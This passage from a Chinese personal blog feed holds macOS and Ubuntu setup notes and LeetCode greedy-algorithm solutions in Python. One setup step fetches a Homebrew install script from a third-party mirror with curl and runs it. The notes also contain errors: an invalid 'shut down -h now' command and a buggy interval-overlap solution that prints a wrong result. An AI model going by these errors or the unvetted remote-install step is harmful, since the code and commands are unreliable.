&quot;$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install)&quot;</code></p><p>换源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git -C <span class="string">&quot;<span class="subst">$(brew --repo)</span>&quot;</span> remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br><span class="line">git -C <span class="string">&quot;<span class="subst">$(brew --repo)</span>&quot;</span> remote set-url origin https:*//mirrors.ustc.edu.cn/brew.git*</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 查询：</span><br><span class="line">brew search 软件名</span><br><span class="line"></span><br><span class="line">// 安装：</span><br><span class="line">brew install 软件名</span><br><span class="line"></span><br><span class="line">// 卸载：</span><br><span class="line">brew uninstall 软件名</span><br><span class="line"></span><br><span class="line">// 更新 Homebrew：</span><br><span class="line">brew update </span><br><span class="line"></span><br><span class="line">// 查看 Homebrew 配置信息：</span><br><span class="line">brew config </span><br></pre></td></tr></table></figure><h2 id="iTerm2-Oh-My-Zsh"><a href="#iTerm2-Oh-My-Zsh" class="headerlink" title="iTerm2 + Oh My Zsh"></a>iTerm2 + Oh My Zsh</h2><p><a href="https://www.jianshu.com/p/9c3439cc3bdb">参考地址</a></p><p>被墙了需要手动下载并运行   <code>https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh</code></p><p>设置主题</p><ul><li>找到文件 <code>open ~/.zshrc</code></li><li>找到<code>ZSH_THEME=&quot;robbyrussell&quot;</code></li><li>主题网站<code>https://github.com/ohmyzsh/ohmyzsh/wiki/Themes</code></li></ul><h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><h3 id="1-进入-bashrc-输入alias-jn-quot-jupyter-notebook-quot"><a href="#1-进入-bashrc-输入alias-jn-quot-jupyter-notebook-quot" class="headerlink" title="1.进入~/.bashrc  输入alias jn=&quot;jupyter notebook&quot;"></a>1.进入<code>~/.bashrc</code>  输入<code>alias jn=&quot;jupyter notebook&quot;</code></h3><h3 id="2-生效source-bashrc"><a href="#2-生效source-bashrc" class="headerlink" title="2.生效source ~/.bashrc"></a>2.生效<code>source ~/.bashrc</code></h3><h3 id="3-应用程序别名"><a href="#3-应用程序别名" class="headerlink" title="3. 应用程序别名"></a>3. 应用程序别名</h3><p><code>alias subl=&quot;/Applications/Sublime\ Text.app/Contents/SharedSupport/bin/subl&quot;</code></p><h2 id="Command-Line-Tools"><a href="#Command-Line-Tools" class="headerlink" title="Command Line Tools"></a>Command Line Tools</h2><ul><li>Apple 家官网：<a href="https://developer.apple.com/download/more/">https://developer.apple.com/download/more/</a></li><li>以 Apple ID 登录</li><li>在搜索框搜索 <code>Command Line Tools</code></li><li>打开你 macOS 上的 XCode，检查其版本号</li><li>下载对应版本的 <code>Command Line Tools</code> 镜像（<code>*.dmg</code>）</li><li>从镜像里手工安装</li></ul><h2 id="Ubuntu-缺少依赖问题"><a href="#Ubuntu-缺少依赖问题" class="headerlink" title="Ubuntu 缺少依赖问题"></a>Ubuntu 缺少依赖问题</h2><h2 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h2><table><thead><tr><th align="center">用途</th><th align="center">命令</th></tr></thead><tbody><tr><td align="center">关机</td><td align="center"><code>shut down -h now</code></td></tr><tr><td align="center">新建root用户</td><td align="center"><code>sudo passwd root</code></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>换源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources_init.list</span><br><span class="line"></span><br><span class="line">sudo gedit /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><h2 id="Hexo个人博客"><a href="#Hexo个人博客" class="headerlink" title="Hexo个人博客"></a>Hexo个人博客</h2><h3 id="安装Gitbrew-install-git"><a href="#安装Gitbrew-install-git" class="headerlink" title="安装Gitbrew install git"></a>安装Git<code>brew install git</code></h3><h3 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">brew install nodejs</span><br><span class="line"></span><br><span class="line">brew install npm</span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">hexo -v</span><br><span class="line"></span><br><span class="line">hexo init myblog</span><br><span class="line"><span class="built_in">cd</span> myblog //进入这个myblog文件夹</span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><h3 id="生成SSH添加到GitHub"><a href="#生成SSH添加到GitHub" class="headerlink" title="生成SSH添加到GitHub"></a>生成SSH添加到GitHub</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span> </span><br><span class="line">git config --global user.email <span class="string">&quot;youremail&quot;</span></span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;youremail&quot;</span></span><br><span class="line"></span><br><span class="line">Github-&gt;Setting-&gt;deploy keys id_rsa.pub</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><h3 id="部署Hexo到Github"><a href="#部署Hexo到Github" class="headerlink" title="部署Hexo到Github"></a>部署Hexo到Github</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">open _config.yml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: https://github.com/YourgithubName/YourgithubName.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">  </span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">  </span><br><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><h2 id="GitBook"><a href="#GitBook" class="headerlink" title="GitBook"></a>GitBook</h2><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gitbook-cli -g</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【LeetCode】【最易懂的贪心算法】</title>
      <link href="2021/01/05/%E3%80%90LeetCode%E3%80%91%E3%80%90%E6%9C%80%E6%98%93%E6%87%82%E7%9A%84%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%E3%80%91/"/>
      <url>2021/01/05/%E3%80%90LeetCode%E3%80%91%E3%80%90%E6%9C%80%E6%98%93%E6%87%82%E7%9A%84%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%E3%80%91/</url>
      
        <content type="html"><![CDATA[<p>贪心算法</p><a id="more"></a><h2 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h2><p>顾名思义，贪心算法或贪心思想采用贪心的策略，保证每次操作都是局部最优的，从而使最 后得到的结果是全局最优的。 <br><br><strong>举一个最简单的例子</strong> <br><br>小明和小王喜欢吃苹果，小明可以吃五个，小王可以吃三个。已知苹 果园里有吃不完的苹果，求小明和小王一共最多吃多少个苹果。在这个例子中，我们可以选用的 贪心策略为，每个人吃自己能吃的最多数量的苹果，这在每个人身上都是局部最优的。又因为全 局结果是局部结果的简单求和，且局部结果互不相干，因此局部最优的策略也同样是全局最优的 策略。</p><h2 id="分配问题"><a href="#分配问题" class="headerlink" title="分配问题"></a>分配问题</h2><h3 id="455-分发饼干（简单）"><a href="#455-分发饼干（简单）" class="headerlink" title="455. 分发饼干（简单）"></a>455. 分发饼干（简单）</h3><p><strong>题目描述：</strong> <br><br>假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。</p><p>对每个孩子$i$，都有一个胃口值$g[i]$，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干$j$，都有一个尺寸$s[j]$。如果 $s[j] &gt;= g[i]$，我们可以将这个饼干$j$分配给孩子$i$，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。</p><p><strong>示例 1:</strong> <br> </p><p>输入: $g = [1,2,3], s = [1,1]$ <br><br>输出: 1 <br><br>解释:  <br><br>你有三个孩子和两块小饼干，3个孩子的胃口值分别是：1,2,3。 <br><br>虽然你有两块小饼干，由于他们的尺寸都是1，你只能让胃口值是1的孩子满足。 <br><br>所以你应该输出1。<br> </p><p><strong>示例 2:</strong> <br> </p><p>输入: $g = [1,2], s = [1,2,3]$ <br><br>输出: 2 <br><br>解释:  <br><br>你有两个孩子和三块小饼干，2个孩子的胃口值分别是1,2。<br><br>你拥有的饼干数量和尺寸都足以让所有孩子满足。<br><br>所以你应该输出2。<br> </p><h4 id="LeetCode-101-解法"><a href="#LeetCode-101-解法" class="headerlink" title="LeetCode 101 解法"></a>LeetCode 101 解法</h4><p><strong>思路</strong></p><ul><li>先将孩子和饼干都排序，每次让胃口值吃能满足其胃口值最小的饼干即可。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] </span><br><span class="line">s = [<span class="number">1</span>,<span class="number">1</span>]  </span><br><span class="line"></span><br><span class="line">g1 = [<span class="number">1</span>,<span class="number">2</span>] </span><br><span class="line">s1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findContentChildren</span>(<span class="params">g,s</span>) -&gt; int:</span></span><br><span class="line">    g = <span class="built_in">sorted</span>(g)</span><br><span class="line">    s = <span class="built_in">sorted</span>(s)</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>((i &lt; <span class="built_in">len</span>(g)) &amp; (j &lt; <span class="built_in">len</span>(s))):</span><br><span class="line">        <span class="keyword">if</span> g[i] &lt;= s[j]:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="comment"># 并不需要设置计数器，只需计算孩子吃饼干的个数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findContentChildren2</span>(<span class="params">g,s</span>) -&gt; int:</span></span><br><span class="line">    g = <span class="built_in">sorted</span>(g)</span><br><span class="line">    s = <span class="built_in">sorted</span>(s)</span><br><span class="line">    i,j = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>((i &lt; <span class="built_in">len</span>(g)) &amp; (j &lt; <span class="built_in">len</span>(s))):</span><br><span class="line">        <span class="keyword">if</span> g[i] &lt;= s[j]:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line">findContentChildren2(g1,s1)</span><br></pre></td></tr></table></figure><pre><code>2</code></pre><h3 id="135-分发糖果（困难）"><a href="#135-分发糖果（困难）" class="headerlink" title="135. 分发糖果（困难）"></a>135. 分发糖果（困难）</h3><p><strong>题目描述：</strong> <br><br>老师想给孩子们分发糖果，有 N 个孩子站成了一条直线，老师会根据每个孩子的表现，预先给他们评分。<br> 你需要按照以下要求，帮助老师给这些孩子分发糖果：  <br> </p><ul><li>每个孩子至少分配到 1 个糖果。</li><li>相邻的孩子中，评分高的孩子必须获得更多的糖果。 <br><br>那么这样下来，老师至少需要准备多少颗糖果呢？</li></ul><p><strong>示例 1:</strong> <br> </p><p>输入: [1,0,2] <br><br>输出: 5 <br><br>解释: 你可以分别给这三个孩子分发 2、1、2 颗糖果。<br> </p><p><strong>示例 2:</strong> <br> </p><p>输入: [1,2,2] <br><br>输出: 4 <br><br>解释: 你可以分别给这三个孩子分发 1、2、1 颗糖果。 <br><br>     第三个孩子只得到 1 颗糖果，这已满足上述两个条件。</p><h4 id="LeetCode-101-解法-1"><a href="#LeetCode-101-解法-1" class="headerlink" title="LeetCode 101 解法"></a>LeetCode 101 解法</h4><ul><li>从左到右循环一次，若右比左高（ratings），则candy+1</li><li>再从右到左循环一次，若左比右高（ratings）,则candy+1</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ratings = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">candy</span>(<span class="params">ratings</span>):</span></span><br><span class="line">    <span class="comment">#初始化每个孩子糖果数</span></span><br><span class="line">    candies = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> ratings:</span><br><span class="line">        candies.append(<span class="number">1</span>)</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> i &lt;= <span class="built_in">len</span>(ratings) - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ratings[i - <span class="number">1</span>] &lt; ratings[i]:</span><br><span class="line">            candies[i] = candies[i - <span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">   </span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">1</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">if</span> ratings[i - <span class="number">1</span>] &gt; ratings[i] <span class="keyword">and</span> candies[i - <span class="number">1</span>] &lt;= candies[i]:</span><br><span class="line">            candies[i - <span class="number">1</span>] = candies[i] + <span class="number">1</span></span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> candies:</span><br><span class="line">        <span class="built_in">sum</span> += i </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line">candy(ratings)</span><br></pre></td></tr></table></figure><pre><code>215</code></pre><h4 id="方法1：暴力法"><a href="#方法1：暴力法" class="headerlink" title="方法1：暴力法"></a>方法1：暴力法</h4><p><strong>思路</strong></p><ul><li>从左到右扫描 <ul><li>若i比i-1评分高，就给i糖更新至[i-1]糖+1</li><li>若i比i+1评分高，就给i糖更新至[i+1]糖+1</li></ul></li><li>一直重复，设置变动flag，直至不再candies不再出现变换</li></ul><p>复杂度分析</p><p>时间复杂度：O(n^2)。对于每个元素，我们最多要遍历 n 次。</p><p>空间复杂度： O(n)。需要一个长度为 n 的 candies数组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ratings = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">candy1</span>(<span class="params">ratings</span>):</span></span><br><span class="line">    candies = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> ratings:</span><br><span class="line">        candies.append(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> flag:</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= <span class="built_in">len</span>(ratings) - <span class="number">1</span>:</span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> ratings[i - <span class="number">1</span>] &lt; ratings[i] <span class="keyword">and</span> candies[i - <span class="number">1</span>] &gt;= candies[i] :</span><br><span class="line">                candies[i] = candies[i - <span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(ratings) - <span class="number">1</span> <span class="keyword">and</span> ratings[i + <span class="number">1</span>] &lt; ratings[i] <span class="keyword">and</span> candies[i + <span class="number">1</span>] &gt;= candies[i] :</span><br><span class="line">                candies[i] = candies[i + <span class="number">1</span>] + <span class="number">1</span> </span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> candies:</span><br><span class="line">        <span class="built_in">sum</span> += i </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line">candy1(ratings)</span><br></pre></td></tr></table></figure><pre><code>5</code></pre><h4 id="方法-2：用两个数组"><a href="#方法-2：用两个数组" class="headerlink" title="方法 2：用两个数组"></a>方法 2：用两个数组</h4><p><strong>思路</strong></p><ul><li><code>l2r</code>数组：从左向右扫描</li><li><code>r2l</code>数组：从右向左扫描</li><li>取 <code>max(l2r[i],r2l[i)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ratings = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">candy2</span>(<span class="params">ratings</span>):</span></span><br><span class="line">    l2r = []</span><br><span class="line">    r2l = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> ratings:</span><br><span class="line">        l2r.append(<span class="number">1</span>)</span><br><span class="line">        r2l.append(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(ratings):</span><br><span class="line">        <span class="keyword">if</span> ratings[i - <span class="number">1</span>] &lt; ratings[i]:</span><br><span class="line">            l2r[i] = l2r[i - <span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    j = <span class="built_in">len</span>(ratings) - <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> j &gt;= <span class="number">0</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ratings[j + <span class="number">1</span>] &lt; ratings[j]:</span><br><span class="line">            r2l[j] = r2l[j + <span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">        j -= <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#print(l2r)</span></span><br><span class="line">    <span class="comment">#print(r2l)</span></span><br><span class="line">    candies = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(l2r):</span><br><span class="line">        candies.append(<span class="built_in">max</span>(l2r[i],r2l[i]))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">   </span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span>     </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> candies:         </span><br><span class="line">        <span class="built_in">sum</span> += c   </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line">candy2(ratings)</span><br></pre></td></tr></table></figure><pre><code>5</code></pre><h4 id="方法-3：使用一个数组"><a href="#方法-3：使用一个数组" class="headerlink" title="方法 3：使用一个数组"></a>方法 3：使用一个数组</h4><p>(同LeetCode101解法 略)</p><h4 id="方法-4：常数空间一次遍历"><a href="#方法-4：常数空间一次遍历" class="headerlink" title="方法 4：常数空间一次遍历"></a>方法 4：常数空间一次遍历</h4><p>直接看不懂 下次再说吧</p><h2 id="区间问题"><a href="#区间问题" class="headerlink" title="区间问题"></a>区间问题</h2><h3 id="435-无重叠区间（中等）"><a href="#435-无重叠区间（中等）" class="headerlink" title="-435. 无重叠区间（中等）"></a>-435. 无重叠区间（中等）</h3><p>给定一个区间的集合，找到需要移除区间的最小数量，使剩余区间互不重叠。</p><p>注意:  可以认为区间的终点总是大于它的起点。</p><p>区间 [1,2] 和 [2,3] 的边界相互“接触”，但没有相互重叠。</p><p><strong>示例 1:</strong> </p><p>输入: [ [1,2], [2,3], [3,4], [1,3] ]  </p><p>输出: 1  </p><p>解释: 移除 [1,3] 后，剩下的区间没有重叠。</p><p><strong>示例 2:</strong>  </p><p>输入: [ [1,2], [1,2], [1,2] ]  </p><p>输出: 2  </p><p>解释: 你需要移除两个 [1,2] 来使剩下的区间没有重叠。</p><p><strong>示例 3:</strong> </p><p>输入: [ [1,2], [2,3] ]  </p><p>输出: 0  </p><p>解释: 你不需要移除任何区间，因为它们已经是无重叠的了。</p><h4 id="Leetcode-101-解法"><a href="#Leetcode-101-解法" class="headerlink" title="Leetcode 101 解法"></a>Leetcode 101 解法</h4><p><strong>贪心策略：</strong> 优先保留结尾小且不相交的区间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intervals = [[<span class="number">1</span>,<span class="number">100</span>],[<span class="number">11</span>,<span class="number">22</span>],[<span class="number">1</span>,<span class="number">11</span>],[<span class="number">2</span>,<span class="number">12</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义关键字进行排序 对end进行排序 </span></span><br><span class="line">intervals.sort(key = <span class="keyword">lambda</span> obj:obj[<span class="number">1</span>], reverse=<span class="literal">False</span>)</span><br><span class="line">intervals</span><br></pre></td></tr></table></figure><pre><code>[[1, 11], [2, 12], [11, 22], [1, 100]]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eraseOverlapIntervals</span>(<span class="params">intervals</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(intervals) == <span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    intervals.sort(key = <span class="keyword">lambda</span> obj:obj[<span class="number">1</span>], reverse=<span class="literal">False</span>) </span><br><span class="line">    </span><br><span class="line">    total = <span class="number">1</span></span><br><span class="line">    x_end = intervals[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    print(x_end)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> interval <span class="keyword">in</span> intervals:</span><br><span class="line">        print(interval)</span><br><span class="line">        <span class="keyword">if</span> interval[<span class="number">1</span>] &gt; x_end:</span><br><span class="line">            total += <span class="number">1</span></span><br><span class="line">            x_end = interval[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(intervals)-total</span><br><span class="line"></span><br><span class="line">eraseOverlapIntervals(intervals)</span><br></pre></td></tr></table></figure><pre><code>11[1, 11][2, 12][11, 22][1, 100]0</code></pre><h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><p><img src="attachment:image.png" class="lazyload" data-srcset="attachment:image.png" 